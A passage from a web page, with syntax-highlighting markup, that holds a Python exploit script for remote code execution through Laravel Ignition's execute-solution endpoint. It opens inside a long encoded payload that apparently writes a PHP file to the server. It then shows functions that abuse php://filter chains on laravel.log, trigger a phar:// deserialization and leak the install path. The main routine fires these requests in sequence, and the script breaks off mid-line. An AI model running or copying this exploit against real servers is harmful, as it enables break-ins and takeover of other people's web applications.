0=44=00=64=00=6D=00=57=00=45=00=70=00=73=00=5A=00=45=00=68=00=57=00=65=00=57=00=4A=00=70=00=55=00=6B=00=56=00=50=00=4D=00=7A=00=46=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=53=00=53=00=30=00=4E=00=53=00=52=00=55=00=74=00=59=00=64=00=48=00=6C=00=61=00=57=00=46=00=49=00=78=00=59=00=32=00=30=00=30=00=5A=00=31=00=6C=00=74=00=52=00=6E=00=70=00=61=00=56=00=46=00=6B=00=77=00=57=00=44=00=4A=00=57=00=64=00=56=00=6B=00=79=00=4F=00=57=00=74=00=61=00=55=00=32=00=64=00=72=00=55=00=6B=00=4E=00=72=00=4E=00=32=00=5A=00=58=00=57=00=6A=00=46=00=69=00=62=00=55=00=34=00=77=00=59=00=56=00=63=00=35=00=64=00=55=00=6C=00=46=00=4F=00=47=00=39=00=4B=00=52=00=56=00=46=00=77=00=5A=00=54=00=4E=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=55=00=4A=00=70=00=57=00=56=00=68=00=4F=00=62=00=45=00=35=00=71=00=55=00=6D=00=5A=00=61=00=52=00=31=00=5A=00=71=00=59=00=6A=00=4A=00=53=00=62=00=45=00=74=00=44=00=55=00=6B=00=56=00=4C=00=56=00=48=00=51=00=35=00=53=00=6B=00=5A=00=42=00=4F=00=55=00=6F=00=7A=00=51=00=6D=00=68=00=6A=00=4D=00=30=00=31=00=75=00=54=00=33=00=6C=00=53=00=56=00=31=00=42=00=54=00=5A=00=48=00=64=00=5A=00=57=00=47=00=78=00=7A=00=59=00=6A=00=4A=00=47=00=61=00=30=00=70=00=36=00=63=00=32=00=74=00=57=00=52=00=44=00=42=00=75=00=54=00=54=00=4A=00=4E=00=4D=00=6C=00=70=00=55=00=51=00=6D=00=6C=00=50=00=52=00=30=00=55=00=31=00=57=00=58=00=70=00=46=00=4D=00=55=00=31=00=71=00=53=00=54=00=42=00=5A=00=55=00=32=00=4D=00=33=00=59=00=56=00=64=00=5A=00=62=00=32=00=46=00=59=00=54=00=6E=00=70=00=61=00=57=00=46=00=46=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=65=00=56=00=4A=00=52=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=64=00=51=00=56=00=54=00=68=00=76=00=55=00=6C=00=4E=00=6F=00=55=00=45=00=74=00=44=00=55=00=6D=00=5A=00=56=00=52=00=54=00=6C=00=55=00=56=00=6B=00=5A=00=7A=00=61=00=31=00=56=00=47=00=4D=00=48=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=52=00=53=00=56=00=6B=00=35=00=55=00=55=00=31=00=55=00=35=00=54=00=31=00=64=00=35=00=55=00=6C=00=64=00=59=00=55=00=32=00=74=00=77=00=5A=00=58=00=6C=00=53=00=54=00=56=00=42=00=54=00=55=00=6D=00=5A=00=56=00=4D=00=46=00=5A=00=55=00=56=00=54=00=42=00=73=00=55=00=46=00=52=00=73=00=63=00=32=00=74=00=57=00=62=00=44=00=41=00=33=00=53=00=6B=00=56=00=46=00=4F=00=56=00=70=00=59=00=61=00=48=00=64=00=69=00=52=00=7A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=62=00=6D=00=5A=00=44=00=59=00=33=00=4E=00=4B=00=52=00=58=00=64=00=77=00=54=00=7A=00=4A=00=4F=00=63=00=31=00=6C=00=59=00=54=00=6E=00=70=00=4A=00=52=00=55=00=34=00=33=00=59=00=30=00=68=00=57=00=61=00=57=00=4A=00=48=00=62=00=47=00=70=00=4A=00=52=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=7A=00=55=00=79=00=59=00=6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">filterlog</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req  <span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"phar://"</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">"\storage\\logs\\laravel.log\\test.txt"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">pharl</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"phar://"</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">"/storage/logs/laravel.log/test.txt"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">path</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(\#\d*\ (.*)(?:\/|\\)vendor)'</span><span class="token punctuation">)</span>    m<span class="token operator">=</span>pattern<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''  ██████ ▓█████  ▄████▄   ██▓███   ██▀███   ▒█████    ██████ ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ░ ▓██▄   ▒███   ▒▓█    ▄ ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄     ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░  ▒   ██▒▒██████▒▒░▒████▒▒ ▓███▀ ░▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░░  ░  ░     ░   ░        ░░         ░░   ░ ░ ░ ░ ▒  ░  ░  ░        ░     ░  ░░ ░                  ░         ░ ░        ░                  ░                                             '''</span><span class="token punctuation">)</span>url<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/_ignition/execute-solution"</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>AA<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">":"</span> <span class="token keyword">in</span> path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"windows"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>sendpayloadwindows<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>filterlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>phar<span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token 